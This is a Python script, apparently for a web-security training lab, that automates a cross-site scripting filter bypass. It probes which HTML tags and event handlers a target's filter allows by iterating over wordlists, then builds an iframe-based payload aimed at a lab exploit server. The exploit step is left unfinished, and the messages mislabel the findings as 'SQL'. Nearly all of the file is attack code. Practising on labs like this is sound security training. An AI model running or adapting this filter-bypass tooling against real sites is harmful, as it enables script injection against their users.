import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_tag_xss(s,url):
    tags = open("tags.txt","r")
    tags_list = tags.read().split("\n")
    for tg in tags_list:
        payload = "<%s>" %tg
        payload_encode = urllib.parse.quote(payload)
        r = s.get(url+payload,verify=False,proxies=proxies)
        print(url+payload_encode)
        if "Tag is not allowed" not in r.text:
            return tg
    return False


def get_event_xss(s,url,tag):
    events = open("events.txt","r")
    events_list = events.read().split("\n")
    for ev in events_list:
        payload = "<%s %s=print()>" %(tag,ev)
        payload_encode = urllib.parse.quote(payload)
        r = s.get(url+payload,verify=False,proxies=proxies)
        print(url+payload_encode)
        if "Attribute is not allowed" not in r.text:
            return ev
    return False


def exploit_server(s,url,tag,event):
    code = "<%s %s=print()>" %(tag,event)
    code_encode = urllib.parse.quote(code)
    path = url+ code_encode
    payload = "<iframe src='%s' onload=this.style.width='100px'>" %path
    exploit = "https://exploit-ac6a1f1a1f25936d80c623cc01e800bb.web-security-academy.net/exploit"
    


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s css alert' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    tag = get_tag_xss(s,url)

    if tag:
        print("[+] SQL tag is: "+tag)
    else:
        print("[-] SQL tag was not extracted")
    
    event = get_event_xss(s,url,tag)

    if event:
        print("[+] SQL event is: "+event)
    else:
        print("[-] SQL event was not extracted")

    exploit_server(s,url,tag,event)